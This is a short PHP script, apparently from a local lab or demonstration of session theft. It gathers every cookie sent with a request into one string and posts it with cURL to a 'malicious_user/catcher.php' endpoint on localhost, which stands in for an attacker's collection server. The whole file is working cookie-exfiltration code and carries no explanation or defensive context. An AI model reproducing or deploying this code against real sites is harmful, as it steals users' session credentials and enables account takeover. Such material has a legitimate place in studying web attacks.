<?php
session_start();

//see cookie
//$str_send = json_encode($_COOKIE);
//echo $str_send;
$cookie_str = '';
foreach (array_keys($_COOKIE) as $key) {
    $cookie_str = $cookie_str . $key . '=' . $_COOKIE[$key] . ";";
}
//echo $cookie_str;

$url = 'http://localhost/malicious_user/catcher.php';
$data = array('confidental' => $cookie_str);

$fields_string = http_build_query($data);

//open connection
$ch = curl_init();

//set the url, number of POST vars, POST data
curl_setopt($ch,CURLOPT_URL, $url);
curl_setopt($ch,CURLOPT_POST, true);
curl_setopt($ch,CURLOPT_POSTFIELDS, $fields_string);

//So that curl_exec returns the contents of the cURL; rather than echoing it
curl_setopt($ch,CURLOPT_RETURNTRANSFER, true); 

//execute post
$result = curl_exec($ch);
echo $result;

?>